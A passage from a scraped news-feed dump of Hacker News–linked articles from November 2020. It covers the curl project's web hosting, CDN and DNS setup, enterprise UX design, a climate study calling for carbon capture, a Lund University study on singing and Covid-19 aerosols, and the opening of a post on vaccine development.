<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2016/04/good_curl_logo-1200x459.png" alt="" width="379" height="145" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2016/04/good_curl_logo-1200x459.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/04/good_curl_logo-200x76.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2016/04/good_curl_logo-450x172.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2016/04/good_curl_logo-768x294.png 768w" sizes="(max-width: 379px) 100vw, 379px"></figure></div>



<p>The <a href="https://daniel.haxx.se/blog/2016/05/27/a-new-curl-logo/" data-type="post" data-id="8817">curl logo</a> is designed by a proper designer however (Adrian Burcea).</p>



<p>If you want to help out designing and improving the web site, you’d be most welcome!</p>



<h2>Who</h2>



<p>I’ve already touched on it: the web site is mostly available in git so “anyone” can submit issues and pull-requests to improve it, and we are around twenty persons who have push rights that can then make a change on the live site. In reality of course we are not that many who work on the site any ordinary month, or even year.  During the last twelve month period, 10 persons authored commits in the web repository and I did 90% of those.</p>



<h2>How</h2>



<p>Technically, we build the site with traditional makefiles and we generate the web contents mostly by preprocessing files using a C-like preprocessor called <a href="https://daniel.haxx.se/projects/fcpp/">fcpp</a>. This is an old and rather crude setup that we’ve used for over twenty years but it’s functional and it allows us to have a mostly static web site that is also fairly easy to build locally so that we can work out and check improvements before we push them to the git repository and then out to the world.</p>



<p>The web site is of course only available over HTTPS.</p>



<h2>Hosting</h2>



<div><figure><a href="https://www.haxx.se/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2018/01/Haxx_logo_2010.png" alt="" width="288" height="97" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2018/01/Haxx_logo_2010.png 1046w, https://daniel.haxx.se/blog/wp-content/uploads/2018/01/Haxx_logo_2010-200x68.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2018/01/Haxx_logo_2010-450x152.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2018/01/Haxx_logo_2010-768x260.png 768w, https://daniel.haxx.se/blog/wp-content/uploads/2018/01/Haxx_logo_2010-1038x354.png 1038w" sizes="(max-width: 288px) 100vw, 288px"></a></figure></div>



<p>The <a href="https://daniel.haxx.se/blog/2020/10/23/a-server-transition/" data-type="post" data-id="14836">curl web site is hosted</a> on an origin VPS server in Sweden. The machine is maintained by primarily by me and is paid for by <a href="https://www.haxx.se/">Haxx</a>. The exact hosting is not terribly important because users don’t really interact with our server directly… (Also, as they’re not sponsors we’re just ordinary customers so I won’t mention their name here.)</p>



<h2>CDN</h2>



<p>A few years ago we experienced repeated server outages simply because our own infrastructure did not handle the load very well, and in particular not the traffic spikes that could occur when I would post a blog post that would suddenly reach a wide audience.</p>



<div><figure><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo-1200x630.png" alt="" width="242" height="127" srcset="https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo.png 1200w, https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo-200x105.png 200w, https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo-450x236.png 450w, https://daniel.haxx.se/blog/wp-content/uploads/2017/04/fastly-logo-768x403.png 768w" sizes="(max-width: 242px) 100vw, 242px"></figure></div>



<p>Enter <a href="https://www.fastly.com/">Fastly</a>. Now, when you go to <a href="https://curl.se/">curl.se</a> (or <a href="https://daniel.haxx.se/">daniel.haxx.se</a>) you don’t actually reach the origin server we admin, you will instead  reach one of Fastly’s servers that are distributed across the world. They then fetch the web contents from our origin, cache it on their edge servers and send it to you when you browse the site. This way, your client speaks to a server that is likely (much) closer to you than the origin server is and you’ll get the content faster and experience a “snappier” web site. And our server only gets a tiny fraction of the load.</p>



<p>Technically, this is achieved by the name <strong>curl.se</strong> resolving to a number of IP addresses that are <a href="https://en.wikipedia.org/wiki/Anycast">anycasted</a>. Right now, that’s 4 IPv4 addresses and 4 IPv6 addresses.</p>



<p>The fact that the CDN servers cache content “a while” is another explanation to why updated contents take a little while to “take effect” for all visitors.</p>



<h2>DNS</h2>



<p>When we just recently switched the site over to <a href="https://daniel.haxx.se/blog/2020/11/04/the-journey-to-a-curl-domain/" data-type="post" data-id="14930">curl.se</a>, we also adjusted how we handle DNS.</p>



<div><figure><a href="https://www.kirei.se/"><img loading="lazy" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/11/kirei.png" alt="" width="265" height="117"></a></figure></div>



<p>I run our own main DNS server where I control and admin the zone and the contents of it.  We then have four secondary servers to help us really up our reliability. Out of those four secondaries, three are sponsored by <a href="https://www.kirei.se/">Kirei</a> and are anycasted. They should be both fast and reliable for most of the world.</p>



<p>With the help of fabulous friends like Fastly and Kirei, we hope that the curl web site and services shall remain stable and available.</p>



<p>DNS enthusiasts have remarked that we don’t do DNSSEC or registry-lock on the curl.se domain. I think we have reason to consider and possibly remedy that going forward.</p>



<h2>Traffic</h2>



<p>The curl web site is just the home of our little open source project. Most users out there in the world who run and use curl or libcurl will not download it from us. Most curl users get their software installation from their Linux distribution or operating system provider. The git repository and all issues and pull-requests are done on GitHub.</p>



<p>Relevant here is that we have no logging and we run no ads or any analytics. We do this for maximum user privacy and partly because of laziness, since handling logging from the CDN system is work. Therefore, I only have aggregated statistics.</p>



<p>In this autumn of 2020, over a normal 30 day period, the web site serves almost 11 TB of data to 360 million HTTP requests. The traffic volume is up from 3.5 TB the same time last year. 11 terabytes per 30 days equals about 4 megabytes per second on average.</p>



<p>Without logs we cannot know what people are downloading – but we can guess! We know that the <a href="https://curl.haxx.se/docs/caextract.html">CA cert bundle</a> is popular and we also know that in today’s world of containers and CI systems, a lot of things out there will download the same packages repeatedly. Otherwise the web site is mostly consisting of text and very small images.</p>



<p>One interesting specific pattern on the server load that’s been going on for months: every morning at 05:30 UTC, the site gets over 50,000 requests within that single minute, during which 10 gigabytes of data is downloaded. The clients are distributed world wide as I see the same pattern on access points all over. The minute before and the minute after, the average traffic rate remains at 200MB/minute. It makes for a fun graph:</p>



<figure><img loading="lazy" width="1525" height="471" src="https://daniel.haxx.se/blog/wp-content/uploads/2020/11/Screenshot_2020-11-24-Fastly-Stats-curl.png" alt=""><figcaption>An eight hour zoomed in window of bytes transferred from the web site. UTC times.</figcaption></figure>



<p>Our servers suffer somewhat from being the target of weird clients like <a href="https://daniel.haxx.se/blog/2020/04/09/a-qqgamehall-storm/" data-type="post" data-id="13880">qqgamehall</a> that continuously “hammer” the site with requests at a high frequency many months after we started always returning error to them. An effect they have is that they make the admin dashboard to constantly show a very high error rate.</p>



<h2>Software</h2>



<p>The origin server runs Debian Linux and Apache httpd. It has a reverse proxy based on nginx. The DNS server is bind. The entire web site is built with free and open source. Primarily: fcpp, make, roffit, perl, curl, hypermail and enscript.</p>



<p>If you curl the curl site, you can see in response headers that <a href="https://www.fastly.com/blog/benefits-using-varnish">Fastly uses Varnish</a>.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/11/24/the-curl-web-infrastructure/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197053</guid>
            <pubDate>Tue, 24 Nov 2020 10:09:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Enterprise UX Design: Make me think]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 10 (<a href="https://news.ycombinator.com/item?id=25197041">thread link</a>) | @Dmytro_Trotsko
<br/>
November 24, 2020 | https://adamfard.com/blog/enterprise-ux | <a href="https://web.archive.org/web/*/https://adamfard.com/blog/enterprise-ux">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="article-content"><p>“Don’t make me think” is a renowned mantra in the world of design, coined by Steve Krug. It has served as a guiding principle in the world of design and UX for twenty&nbsp;years. It teaches us how to create great experiences in a straightforward and accessible manner.&nbsp;</p><p>In today’s article, we’d like to look into enterprise design and its peculiarities. It’s essential to underline that the very nature of enterprise UX slightly differs from consumer UX. As a result, some of Krug’s principles must be adjusted when designing enterprise software.&nbsp;</p><p>This article is by no means a refutation of the design principle. Please treat it as a mere asterisk with a fine print at the bottom.</p><h2><strong>Learning curves aren’t inherently bad</strong></h2><p>According to Krug, products that make people think also make people unhappy. <a href="https://uxdesign.cc/the-learning-curve-design-problem-4d4dc2965098">Products with steep learning curves</a> very rarely succeed in the modern business ecosystem. Customers will pretty much always choose the path of least resistance. This isn’t necessarily true of enterprise products.</p><p>Enterprise users are power users — and it’s imperative that we take this into account when designing products for them. They interact with niche software on a daily basis and quite possibly for many years. They know their way around the logic of the products they use.&nbsp;</p><p>Creating an interface that demands some learning results in a steeper learning curve isn’t inherently wrong. It allows users to work more efficiently once they’ve invested a certain amount of time into training and learning.&nbsp;</p><figure><img src="https://www.datocms-assets.com/16499/1606137908-figma-shortcuts-cheatsheet-1014x487.jpg?w=900&amp;auto=compress"><figcaption><a href="https://www.figmacrush.com/figma-shortcuts-cheatsheet/">Source</a></figcaption></figure><p>Take, for instance, products like Figma, Sketch, Adobe Pro, or any other professional software — most of them have a wide array of shortcuts. Features such as shortcuts may take a while to master, but they’ll ensure a significant boost in productivity once learned.&nbsp;</p><h2>Simplify cautiously&nbsp;</h2><p>We’re very well aware of the importance of keeping interfaces simple and obvious. However, it’s essential to keep in mind the complexity of the tasks typically performed in enterprise software. The pursuit for a clean UI could rid users of the vital context necessary to get work done.&nbsp;</p><p>Plus, it can be argued that by making the interface too simple, we risk generating friction rather than eliminating it. Let’s envision an interface of a product that displays a wide array of charts and data, like a trading platform.&nbsp;</p><p><img src="https://www.datocms-assets.com/16499/1606138044-image2.png?w=900&amp;auto=compress"></p><p>A professional that regularly interacts with visual data needs immediate access to it at all times. Having to perform extra actions to access vital features is both frustrating and unproductive. And here lies one of the most significant differences between consumer UX and enterprise UX (eUX).&nbsp;</p><p>Consumer UX is really passionate about sleek UIs, while enterprise software must ensure that users are able to do their work comfortably. Therefore, simplified, minimalistic interfaces aren’t really what eUX designers are after.&nbsp;</p><h2>Wizards are cool, but…</h2><p><a href="https://adamfard.com/blog/ux-onboarding">Onboarding your users</a> is a vital step aimed at ensuring optimal user experience. However, while Wizards and guided tours are an excellent solution for casual users, it’s not necessarily the case for power users.&nbsp;</p><p>In both consumer and enterprise UX, designers must aim to develop products that require <a href="https://adamfard.com/blog/stickiness">as little hand-holding as possible</a>. However, simplistic product tours can be… well, simplistic. They often fail to uncover the entire functionality of a product, which is especially relevant for experienced users.&nbsp;</p><p>After running a series of tests, we found out that enterprise users tend to prefer to leave the app or platform for instructions. While this does seem somewhat disruptive to the experience of a product — it is understandable.&nbsp;</p><p><img src="https://www.datocms-assets.com/16499/1606210515-initiative-alladded1-1.png?w=900&amp;auto=compress"></p><p>Off-page instructions can provide more in-depth explanations rather than the ones that are placed on the screen. Compare, for instance, a tool-tip and an article dedicated to a particular function.&nbsp;</p><h2>Plan for non-linear flows&nbsp;</h2><p>When it comes to designing eUX UIs, designers face a truly arduous task of creating complex, non-linear flows. These flows often involve a variety of roles, profile types, responsibilities, kinds of security, and much more. Our goal is to create a consistent and recognizable experience throughout all of these variables.&nbsp;</p><p>The complicated part, however, is not to force users into flows and scenarios. Experts and professional users need that freedom to make decisions and use the platform as they see fit.</p><p>Think of a person that is deeply versed in Microsoft Excel. They’ve been using this software for nearly a decade, and they know it like the back of their hand. More importantly, they have their style of working and solving problems. Limiting such users via linear and rigid flows could defeat the purpose of boosting their productivity.&nbsp;</p><h2>Don’t fix it if it’s not broken</h2><p>Innovation is a crucial element of UX design. We strive to continuously seek new and creative solutions to old problems. Often, we can even choose to be bold and put forth experimental solutions.&nbsp;</p><p>However, when it comes to eUX, we have to be somewhat more conservative and experiment with caution. Enterprise software isn’t quite receptive to design solutions that go against the grain.&nbsp;</p><p>Since the central purpose of such software is to deliver quality work in short amounts of time, “reinventing the wheel” isn’t always a great idea.&nbsp;</p><p>When designing for enterprise, keeping an eye on your competition is even more relevant than in consumer software.&nbsp;</p><p>Let’s go back to Excel once more — imagine <a href="https://adamfard.com/blog/website-redesign">you’re trying to reinvent</a> a complex, spreadsheet-based product. You’re looking to change the ways it represents data, or certain actions are performed. While this does sound like a laudable task, the critical question is — why?&nbsp;</p><p>In eUX, the real value of a product is in its unique selling point that is translated via a design that looks familiar and intuitive.&nbsp;</p><p>That is not to say that the light of innovation never shines on enterprise products, but user expectations often trim the lengths we can go.&nbsp;</p><h2>In conclusion</h2><p>In order to reward you, our beloved reader, for making it till the end, we’ve designed a picture that summarizes the arguments in this article. We hope it will come in handy.</p><p><img src="https://www.datocms-assets.com/16499/1606138895-enterprise-ux-summary.png?w=900&amp;auto=compress"></p><p>While the principles of “don’t make me think” will most likely outlive us, it’s crucial to outline the situations where they can be somewhat amended.&nbsp;</p><p>Enterprise user experience is a slightly more conservative field in terms of design, yet these limitations push us to become even more creative. By operating within these constraints, we have the power to make the future of work exciting and even more promising.&nbsp;</p><p>Meta: In this article, we explore the peculiarities of enterprise user experience design (eUX) through the lens of the “Don’t make me think” principle.&nbsp;</p></article></div>]]>
            </description>
            <link>https://adamfard.com/blog/enterprise-ux</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197041</guid>
            <pubDate>Tue, 24 Nov 2020 10:07:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Any hope of keeping Earth habitable requires sucking CO2 out of the atmosphere]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25197019">thread link</a>) | @jeremylevy
<br/>
November 24, 2020 | https://www.businessinsider.fr/us/climate-change-too-late-carbon-capture-needed-2020-11 | <a href="https://web.archive.org/web/*/https://www.businessinsider.fr/us/climate-change-too-late-carbon-capture-needed-2020-11">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
                                <h2>Even if greenhouse-gas emissions stop now, global warming will continue for centuries, a study shows. The solution: removing carbon from the air.</h2>
                            </p><div>
                                <ul><li>Even if the world were to stop emitting greenhouse gases right now, the Earth would keep warming for centuries, a new study shows.</li>
<li>The researchers suggest <a href="https://www.businessinsider.com.au/how-to-stop-gobal-warming-plan-carbon-capture-2018-10">sucking carbon dioxide out of the atmosphere</a> and storing it underground — a solution known as carbon capture and storage.</li>
<li>That's considered a type of <a href="https://www.businessinsider.com/geoengineering-how-to-reverse-climate-change-2019-4">geoengineering</a>. Other <a href="https://www.businessinsider.com/geoengineering-how-to-reverse-climate-change-2019-4">climate-hacking</a> proposals in the same category are far riskier.</li>
<li><a href="https://www.businessinsider.com/?hprecirc-bullet">Visit Business Insider's homepage for more stories</a>.</li></ul><p>Even if we stopped emitting greenhouse gas today, the Earth would continue warming for centuries. Arctic ice and permafrost are already on an irreversible path of melting.</p><p><a href="https://www.nature.com/articles/s41598-020-75481-z">That's the finding of new research</a> published Thursday in the journal Scientific Reports. The model suggests that even if emissions were to drop to zero this year, global temperatures would ultimately rise to be 5.4 degrees Fahrenheit higher in 2500 than they were in 1850 (that's 3 degrees Celsius).</p><p>"The tundra will continue to melt over the next 500 years — irrespective of how quickly humanity cuts its greenhouse-gas emissions," Jørgen Randers, the lead author of the new study, told Business Insider.</p><p>That's because climate change is a vicious, self-sustaining cycle: As permafrost thaws, it releases more greenhouse gases, like methane and carbon dioxide, which sustains warming over time. To stop that cycle, Randers said, we'll need to suck carbon dioxide back out of the atmosphere.</p><h2>8 feet of sea-level rise</h2><p>Randers' study modeled the effect of various emissions-reductions scenarios on Earth's climate between 1850 and 2500.</p><p>The data showed that if emissions stopped for good in 2020, sea levels in 2500 would still be more than 8 feet (2.5 meters) higher than in 1850.</p><figure><img src="https://i.insider.com/5fac2eb9b09abb0018626059?format=jpeg" alt="FILE - In this Aug. 16, 2019, photo, large Icebergs float away as the sun rises near Kulusuk, Greenland. The Trump administration is poised to announce an expanded diplomatic presence in Greenland and a new assistance package for the vast island aimed at thwarting growing Chinese and Russian influence in the Arctic. The announcement, expected Thursday, April 23, 2020, will come less than a year after President Donald Trump drew derision for expressing an interest in buying Greenland. (AP Photo/Felipe Dana, File)" height="2665" width="3557" charset=""><figcaption>Large icebergs float away as the sun rises near Kulusuk, Greenland, August 16, 2019.
<span>Felipe Dana/AP</span>
</figcaption></figure><p>To prevent the projected 3-degree-Celsius temperature increase, greenhouse-gas emissions would need to have ceased entirely between 1960 and 1970, the model found. In that sense, Earth blew by a climactic point of no return 50 years ago — before much of the public understood the realities of climate change.</p><p>"Yes, that is an irony," Randers said. "But of course the scientific community knew about global warming already in the 1960s."</p><h2>We need to suck carbon out of the atmosphere</h2><p>The Paris climate agreement was created with the intention to cut greenhouse-gas emissions enough to keep the world's temperature from rising more than 2 degrees Celsius by 2100. But even if all emissions stopped by 2100, according to Randers' model, sea levels in 2500 would be nearly 10 feet (3 meters) higher than they were in 1850.</p><p>Earth's temperatures are already on track to blow past the Paris agreement's goals. Last year was the <a href="https://www.ncei.noaa.gov/news/projected-ranks#:~:text=The%20warmest%20years%20globally%20have,Courtesy%20of%20NOAA%20NCEI.">second warmest on record</a> for surface temperatures and <a href="https://time.com/5765489/ocean-temperatures-warmest-ever/">the hottest ever for oceans</a>. Polar melting is <a href="https://www.businessinsider.com/sea-level-rise-3-feet-in-80-years-un-report-2019-9" data-analytics-module="body_link" data-analytics-post-depth="40">on track to raise seas 3 feet by 2100</a> and threatens to displace hundreds of millions of people.</p><p>What's needed, Randers said, is for companies and governments to "start developing the technologies for large-scale removal of greenhouse gases from the atmosphere."</p><p>In technical terms, that strategy is known as carbon capture and storage (CCS). To prevent further warming after emissions have stopped, the new study found, at least 33 gigatonnes (36.5 billion tons) of carbon dioxide would need to be sucked out of the atmosphere each year. That's roughly the total amount of carbon dioxide the global fossil-fuel industry emitted in 2018 (<a href="https://www.wri.org/blog/2018/12/new-global-co2-emissions-numbers-are-they-re-not-good#:~:text=Record%20Carbon%20Dioxide%20Emissions%20in%202018&amp;text=This%20year's%20numbers%20confirm%20their,2017%20to%2036.2%20gigatonnes%20CO20CO2">36 gigatonnes</a>).</p><p>Power plants in the US, Canada, and Switzerland have already started utilizing CCS to lower their emissions. In 2014, the Boundary Dam Power Station in Saskatchewan became one of the first in the world to successfully use the technology.</p><p>In total, 21 commercial-scale carbon-capture projects are operating around the world, and 22 more are in development, <a href="https://www.c2es.org/content/carbon-capture/">according to the Center for Climate and Energy Solutions</a>. These projects typically store carbon deep underground in depleted oil and gas fields or in bioreactor containers filled with algae that eats carbon dioxide.</p><figure><img src="https://i.insider.com/5fac4783b09abb001862611c?format=jpeg" alt="bioreactor" height="3744" width="4992" charset=""><figcaption>Bioreactors filled with green algae that eats carbon dioxide in Costa de la Luz, Spain.
<span>Santiago Urquijo/Getty Images</span>
</figcaption></figure><p>Two US carbon-capture completed in 2017 — <a href="https://www.c2es.org/content/carbon-capture/">one in Illinois, one in Texas</a> — can capture 1.1 million and 1.6 million tons of carbon dioxide, respectively, per year. But the amount of CO2 that needs to be removed from the atmosphere requires far more plants than any current plans call for.</p><p>"In other words, building 33,000 big CCS plants and keep them running for ever," the study authors wrote.</p><h2>The pros and cons of geoengineering</h2><p>Carbon capture is becoming widely accepted as a safe and potentially effective form of geoengineering. This and other climate interventions are increasingly being floated <a href="https://www.nature.com/articles/d41586-018-03036-4">by scientists</a> and politicians alike; Andrew Yang, a 2020 Democratic presidential candidate, suggested <a href="https://www.businessinsider.com/andrew-yang-thinks-geoengineering-could-lead-to-war-2019-4">budgeting $800 million</a> for further geoengineering research in the US.</p><p>But most climate-hacking proposals would be far riskier than CCS. Take solar geoengineering, for example, which involves injecting aerosols into the sky to reflect sunlight back into space. Critics of this idea point out that <a href="https://www.nature.com/articles/s41467-017-01606-0">most models predict</a> the effects of solar geoengineering wouldn't stay localized. If a country decided to independently deploy such measures, varying and unpredictable effects would likely be seen in other spots around the globe.</p><p>Aerosol injections deployed in the southern hemisphere, for instance, could impact ocean temperatures and wind speeds, leading to more hurricanes in the northern hemisphere.&nbsp;</p><figure><img src="https://i.insider.com/5c76a74726289812e8235523?format=jpeg" alt="Clouds above earth" height="2848" width="3797" charset=""><figcaption>Subtropical stratocumulus clouds above Earth.
<span>Aleksandar Georgiev/Getty Images</span>
</figcaption></figure><p>"Solar geoengineering has geopolitical ramifications, unlike carbon capture," Juan Moreno-Cruz, an associate professor at the University of Waterloo who studies geoengineering, previously told Business Insider.</p><p>Randers said his study advocates just for carbon capture, not other more experimental forms of geoengineering.&nbsp;</p><p>"I am generally against geoengineering because of its unintended side effects. But if the world continues to delay meaningful and feasible action to phase out fossil fuels, we may have to resort to geoengineering," Randers said.&nbsp;</p><p>As an immediate priority, he added, countries should invest equally in efforts to cut emissions and build more CCS plants.</p><p>"This would be a wonderful task for a government-financed <a href="https://www.businessinsider.com/alexandria-ocasio-cortez-green-new-deal-2019-1">Green New Deal</a>," he said.</p>
                            </div></div>]]>
            </description>
            <link>https://www.businessinsider.fr/us/climate-change-too-late-carbon-capture-needed-2020-11</link>
            <guid isPermaLink="false">hacker-news-small-sites-25197019</guid>
            <pubDate>Tue, 24 Nov 2020 10:03:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Could singing spread Covid-19?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25196920">thread link</a>) | @draugadrotten
<br/>
November 24, 2020 | https://www.lunduniversity.lu.se/article/could-singing-spread-covid-19 | <a href="https://web.archive.org/web/*/https://www.lunduniversity.lu.se/article/could-singing-spread-covid-19">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
      If silence is golden, speech is silver – and singing the worst.<br>
Singing doesn’t need to be silenced, however, but at the moment the wisest thing is to sing with social distancing in place. The advice comes from aerosol researchers at Lund University in Sweden. They have studied the amount of particles we actually emit when we sing – and by extension – if we contribute to the increased spread of Covid-19 by singing.<br>

  </p><div>
  
  
      
  

            <div><p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>“There are many reports about the spreading of Covid-19 in connection with choirs singing. Therefore, different restrictions have been introduced all over the world to make singing safer. So far, however, there has been no scientific investigation of the amount of aerosol particles and larger droplets that we actually exhale when we sing”, says Jakob Löndahl, associate professor of Aerosol Technology at Lund University.</span></span></span></span></span></span></p>

<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>Aerosols are small airborne particles. To get a better understanding of the amount of aerosols and virus particles we actually emit when we sing, 12 healthy singers and two people with confirmed Covid-19 took part in a research project. Seven of the participants were professional opera singers.</span></span></span></span></span></span></p>

<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>The study shows that singing – particularly loud and consonant-rich singing – spreads a lot of aerosol particles and droplets into the surrounding air.&nbsp;</span></span></span></span></span></span></p>

<div data-embed-button="lu_media_embed_button" data-entity-embed-display="view_mode:media.lu_local_video" data-entity-type="media" data-entity-uuid="99ff6e89-19d5-406e-bfa3-856c2f311f36" data-langcode="en">

<article>
  
                  
        



<p>
  Droplets are spread in the air when we sing – here from powerful and consonant-rich singing photographed with a high-speed camera. (The film is silent.) Photo: Alexios Matamis
</p>

  </article>
</div>


<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>“Some droplets are so large that they only move a few decimetres from the mouth before they fall, whereas others are smaller and may continue to hover for minutes. In particular, the enunciation of consonants releases very large droplets and the letters B and P stand out as the biggest aerosol spreaders”, says Malin Alsved, doctoral student of Aerosol Technology at Lund University.</span></span></span></span></span></span></p>

<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>During the research experiments at Lund University’s Aerosol Laboratory, the singers had to wear clean air suits and enter a specially built chamber supplied with filtered, particle-free air. In the chamber, analysis was conducted of the number and mass of particles emitted by singers during breathing, talking, different types of singing and singing with a face mask.&nbsp;</span></span></span></span></span></span></p>

<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>What they sang was a short and plosive-rich Swedish song, “Bibbis pippi Petter”, which was repeated 12 times in two minutes at constant pitch. The same song was also repeated with the consonants removed, leaving only the vowels. During the song tests, aerosols and larger droplets were measured using strong lamps, a high-speed camera and an instrument that can measure very small particles. The louder and more powerful the song, the greater the concentration of aerosols and droplets.</span></span></span></span></span></span></p>

<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>“We also carried out measurements of virus in the air close to two people who sang when they had Covid-19. Their air samples contained no detectable amount of virus, but the viral load can vary in different parts of the airways and between different people. Accordingly, aerosols from a person with Covid-19 may still entail a risk of infection when singing”, says Malin Alsved.</span></span></span></span></span></span></p>

<div data-embed-button="lu_media_embed_button" data-entity-embed-display="view_mode:media.lu_image_large" data-entity-type="media" data-entity-uuid="8f3a5e76-5264-439d-bcb6-165acdd74feb" data-langcode="en">

<article>
  
      

            <p><img src="https://www.lunduniversity.lu.se/sites/www.lunduniversity.lu.se/files/styles/lu_full_width/public/2020-09/jakobitratt_fotograf_malin_alsved.jpg?itok=PqBLxvNK" width="1288" height="1259" alt="Person with head in funnel" typeof="foaf:Image">


</p>
        



 <p>
   During the tests, the singers sang into a funnel. The arosol particles were measured at the other end of the funnel. Photo: Malin Alsved
 </p>

  </article>
</div>


<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>Can we still have choral singing, singalongs during concerts, chanting at sporting events and loud talk in bars? The researchers consider that if we have a good understanding of the risks involved when a group of people sing together, we can also sing in a safer way. The song can be sung with social distancing, good hygiene and good ventilation, which reduces the concentration of aerosol particles in the air. Face masks can also make a difference.</span></span></span></span></span></span></p>

<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>“When the singers were wearing a simple face mask this caught most of the aerosols and droplets and the levels were comparable with ordinary speech”, says Jakob Löndahl.</span></span></span></span></span></span></p>

<p><span><span><span><span lang="EN-GB" xml:lang="EN-GB"><span><span>“Singing does not need to be silenced, but presently it should be done with appropriate measures to reduce the risk of spreading infection”, says Jakob Löndahl.</span></span></span></span></span></span></p>

</div>
      
  </div></div>]]>
            </description>
            <link>https://www.lunduniversity.lu.se/article/could-singing-spread-covid-19</link>
            <guid isPermaLink="false">hacker-news-small-sites-25196920</guid>
            <pubDate>Tue, 24 Nov 2020 09:51:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What if every day was a pandemic day?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25196886">thread link</a>) | @tdmckinlay
<br/>
November 24, 2020 | https://www.exponentialview.co/p/-what-if-every-day-was-a-pandemic | <a href="https://web.archive.org/web/*/https://www.exponentialview.co/p/-what-if-every-day-was-a-pandemic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>This is a member-only post I have made freely accessible. Until 27th November you can sign-up to Exponential View with a 27.18% discount. </em></p><p data-attrs="{&quot;url&quot;:&quot;https://www.exponentialview.co/subscribe?coupon=88ce10a0&quot;,&quot;text&quot;:&quot;Get 27% off for 1 year&quot;,&quot;class&quot;:null}"><a href="https://www.exponentialview.co/subscribe?coupon=88ce10a0"><span>Get 27% off for 1 year</span></a></p><p>Scientists, take a bow.&nbsp;</p><p>With the announcement of the Oxford/AstraZeneca vaccine, we now have three effective vaccines against the coronavirus with 90% efficacy or above. Even the Oxford vaccine reports 90% efficacy with a <a href="https://www.research.ox.ac.uk/Article/2020-11-23-oxford-university-breakthrough-on-global-covid-19-vaccine">particular treatment protocol</a>; more discussion <a href="https://www.statnews.com/2020/11/23/astrazeneca-covid-19-vaccine-is-70-effective-on-average-early-data-show/">about that and what remains to be understood here.</a> Two of these candidates are built on entirely new vaccine platforms, the mRNA candidate approach, while the AstraZeneca vaccine uses a more established platform, which had yet to have <a href="https://cen.acs.org/pharmaceuticals/vaccines/Adenoviral-vectors-new-COVID-19/98/i19">much success in humans</a>.&nbsp;&nbsp;We can expect to hear news from other vaccine candidates like CanSino and Johnson &amp; Johnson soon enough. </p><p>Yet, the vector was only sequenced in January, that sequence, of what was then known as&nbsp; 2019-nCov, released <a href="https://virological.org/t/preliminary-phylogenetic-analysis-of-11-ncov2019-genomes-2020-01-19/329?utm_campaign=Sunday%20Newsletter&amp;utm_source=hs_email&amp;utm_medium=email&amp;utm_content=82449951&amp;_hsenc=p2ANqtz--XAXEbjkdKE-Cv9kBQKH5n6JvAObcypjLpmk139J9YvLm9NTyNh6lJlGfr0sPl6nRjeFP0JWFmFCNNnLy21y-L1mveVQ&amp;_hsmi=82449951">to the world on 19 January 2020</a>. It has taken 310 days, 10 months and change, to achieve this. </p><p>Remarkable:&nbsp; we’ve got this outcome roughly ten times faster<a href="https://wellcome.org/sites/default/files/styles/standalone_image_full_width/public/infographic-vaccine-development-1200x1850.png?itok=y0Cq0Vr2"> than the usua</a>l. Earlier conditions like hepatitis or polio <a href="https://ourworldindata.org/vaccines-antibiotic-dependence?sf83280884=1">took one to three decades</a> from discovery of the infectious agent to a working vaccine.&nbsp;</p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd41b8392-4e99-4f38-b23f-90ad643a78dc_1600x1215.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2Fd41b8392-4e99-4f38-b23f-90ad643a78dc_1600x1215.png" 